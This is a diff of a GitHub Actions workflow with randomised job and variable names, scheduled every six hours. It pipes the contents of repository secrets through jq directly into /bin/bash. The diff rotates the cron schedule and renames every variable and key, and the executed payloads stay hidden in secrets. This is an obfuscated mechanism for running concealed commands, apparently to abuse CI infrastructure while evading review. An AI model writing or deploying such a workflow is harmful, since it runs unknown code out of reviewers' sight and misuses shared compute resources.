@@ -1,28 +1,31 @@
 name: wangsilu6758
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 2/6 * * *'
+    - cron: '11 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wangsilu6758
         env:
-          k61: ${{ secrets.k61 }}
+          zgv237: ${{ secrets.zgv237 }}
         run: |
-          echo $k61 | jq -r .lmdbb970 | /bin/bash
-          echo $jufxa1 | jq -r .l1871 | /bin/bash
-          echo $eero970 | jq -r .l78996 | /bin/bash
-          echo $v5 | jq -r .s8 | /bin/bash
-          echo $eq3997 | jq -r .wl8 | /bin/bash
-          echo $g93308 | jq -r .w45359 | /bin/bash
-          echo $c95 | jq -r .t92 | /bin/bash
-          echo $rv45 | jq -r .vhveq075 | /bin/bash
-          echo $r64370 | jq -r .i1 | /bin/bash
-          echo $kaksj99 | jq -r .oxekc76 | /bin/bash
-          echo $jz016 | jq -r .xfqy3 | /bin/bash
+          echo $zgv237 | jq -r .tshlc59 | /bin/bash
+          echo $tvpbu4849 | jq -r .drsak01237 | /bin/bash
+          echo $md60 | jq -r .fstvs9 | /bin/bash
+          echo $k83447 | jq -r .s50 | /bin/bash
+          echo $rak224 | jq -r .kw86 | /bin/bash
+          echo $bpra8408 | jq -r .ebyc0388 | /bin/bash
+          echo $ikndy69617 | jq -r .uzmf36 | /bin/bash
+          echo $w32 | jq -r .lb27 | /bin/bash
+          echo $glqy168 | jq -r .beck078 | /bin/bash
+          echo $ddc55 | jq -r .ime05 | /bin/bash
+          echo $prq79507 | jq -r .ull55118 | /bin/bash
+          echo $dgdgt477 | jq -r .jil46769 | /bin/bash
+          echo $aqp6147 | jq -r .wr555 | /bin/bash
+          echo $ghn94 | jq -r .jah2 | /bin/bash
 
